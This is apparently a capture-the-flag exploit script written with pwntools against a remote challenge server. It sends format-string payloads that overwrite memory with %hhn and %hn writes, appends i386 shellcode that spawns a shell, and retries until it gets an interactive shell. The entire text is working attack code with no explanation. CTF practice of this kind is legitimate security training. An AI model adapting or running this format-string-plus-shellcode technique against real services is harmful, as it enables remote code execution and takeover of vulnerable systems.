from pwn import *
context(log_level = 'debug',os = 'linux',arch = 'i386')
shellcode = asm(shellcraft.sh())
                                                       
while 1:
    sh=remote("node3.buuoj.cn",27256)
                                                       
    payload = "%12c" + "%6$hhn"
    sh.recvuntil("=\n")
    sh.sendlineafter("=\n",payload)
                                                       
    payload = "%41069c" + "%10$hn" + shellcode
    sh.sendline(payload)
    sh.sendline('quit')
                                                       
    try:
        sh.sendline("echo pwned")
        sh.recvuntil("pwned")
        sh.interactive()
        break;
    except:
        sh.close()
